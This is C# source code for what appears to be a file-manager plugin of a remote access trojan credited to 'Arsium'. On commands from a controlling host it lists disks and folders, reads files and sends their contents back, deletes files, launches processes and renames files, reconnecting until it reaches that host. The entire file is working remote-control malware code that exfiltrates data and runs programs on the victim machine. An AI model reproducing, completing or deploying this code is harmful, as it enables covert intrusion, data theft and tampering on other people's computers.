using PacketLib.Utils;
using PacketLib.Packet;
using PacketLib;
using System.Threading;
using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            string filePath;

            switch (loadingAPI.currentPacket.packetType) 
            {
                case PacketType.FM_GET_DISK:
                    DiskPacket diskPacket = new DiskPacket(GetDisks.GetAllDisks(), loadingAPI.baseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.host, loadingAPI.key, diskPacket);             
                    break;

                case PacketType.FM_GET_FILES_AND_DIRS:
                    string path = ((FileManagerPacket)loadingAPI.currentPacket).path;
                    FileManagerPacket fileManagerPacket = new FileManagerPacket(GetFilesAndDirs.GetAllFilesAndDirs(path), loadingAPI.baseIp, loadingAPI.HWID);
                    fileManagerPacket.path = path;
                    ClientSender(loadingAPI.host, loadingAPI.key, fileManagerPacket);
                    break;

                case PacketType.FM_DOWNLOAD_FILE:
                    filePath = ((DownloadFilePacket)loadingAPI.currentPacket).fileName;
                    DownloadFilePacket downloadFilePacket = new DownloadFilePacket(DownloadFile.ReadFile(filePath), filePath, loadingAPI.baseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.host, loadingAPI.key, downloadFilePacket);
                    break;

                case PacketType.FM_DELETE_FILE:
                    filePath = ((DeleteFilePacket)loadingAPI.currentPacket).path;
                    Tuple<string, bool> returnFromFunc = DeleteFile.RemoveFile(filePath);
                    DeleteFilePacket deleteFilePacket = new DeleteFilePacket(returnFromFunc.Item1, ((DeleteFilePacket)loadingAPI.currentPacket).name, returnFromFunc.Item2, loadingAPI.baseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.host, loadingAPI.key, deleteFilePacket);
                    break;

                case PacketType.FM_START_FILE:
                    filePath = ((StartFilePacket)loadingAPI.currentPacket).filePath;
                    StartFile.StartAProcess(filePath);
                    break;

                case PacketType.FM_RENAME_FILE:
                    RenameFilePacket renameFilePacketReceived = (RenameFilePacket)loadingAPI.currentPacket;
                    RenameFilePacket renameFilePacket = new RenameFilePacket(renameFilePacketReceived.oldName, renameFilePacketReceived.oldPath, renameFilePacketReceived.newName, renameFilePacketReceived.newPath, loadingAPI.baseIp, loadingAPI.HWID)
                    {
                        isRenamed = MoveFile.RenameFile(renameFilePacketReceived.oldPath, renameFilePacketReceived.newPath)
                    };
                    ClientSender(loadingAPI.host, loadingAPI.key, renameFilePacket);
                    break;

                case PacketType.FM_SHORTCUT_PATH:
                    ShortCutFileManagersPacket shortCutFileManagersPacketReceived = (ShortCutFileManagersPacket)loadingAPI.currentPacket;
                    string newPath = "";
                    ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(Shorcuts.ShortcutsWrapper(shortCutFileManagersPacketReceived.shortCuts, ref newPath), loadingAPI.baseIp, loadingAPI.HWID);
                    shortCutFileManagersPacket.shortCuts = shortCutFileManagersPacketReceived.shortCuts;
                    shortCutFileManagersPacket.path = newPath;
                    ClientSender(loadingAPI.host, loadingAPI.key, shortCutFileManagersPacket);
                    break;
            }
            Miscellaneous.CleanMemory();
        }

        private static void ClientSender(Host host, string key, IPacket packet) 
        {
            ClientHandler clientHandler = new ClientHandler(host, key);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(1000);

            clientHandler.SendPacket(packet);
        }
    }
}
